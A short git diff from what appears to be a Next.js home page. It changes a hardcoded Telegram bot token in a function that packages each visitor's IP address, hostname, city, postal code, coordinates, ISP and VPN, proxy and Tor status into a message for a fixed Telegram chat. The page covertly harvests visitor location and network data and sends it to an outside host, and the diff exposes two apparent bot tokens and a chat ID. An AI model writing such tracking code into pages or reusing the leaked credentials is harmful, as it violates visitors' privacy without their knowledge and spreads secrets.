@@ -52,7 +52,7 @@ export default function Home() {
   }, []);
 
   const sendToTelegram = async (data: IPInfo) => {
-    const telegramBotToken = '7813198341:AAHB2EMoobhTABCayuHVCzJYhrY4e8pRQeo'; // Replace with your bot token
+    const telegramBotToken = '7813198341:AAGe3L2osE7r6NFs5malKDbCx82OKxlmqto'; // Replace with your bot token
     const chatId = '5086819565'; // Replace with your chat ID
     const message = `Visitor Info:\nIP: ${data.ip}\nHostname: ${data.hostname}\nCity: ${data.city}\nRegion: ${data.region}\nCountry: ${data.country}\nPostal Code: ${data.postal}\nLocation (Lat, Long): ${data.loc}\nTimezone: ${data.timezone}\nOrganization/ISP: ${data.org}\nVPN Detected? ${data.privacy.vpn ? 'Yes' : 'No'}\nProxy Detected? ${data.privacy.proxy ? 'Yes' : 'No'}\nTor Detected? ${data.privacy.tor ? 'Yes' : 'No'}`;
     
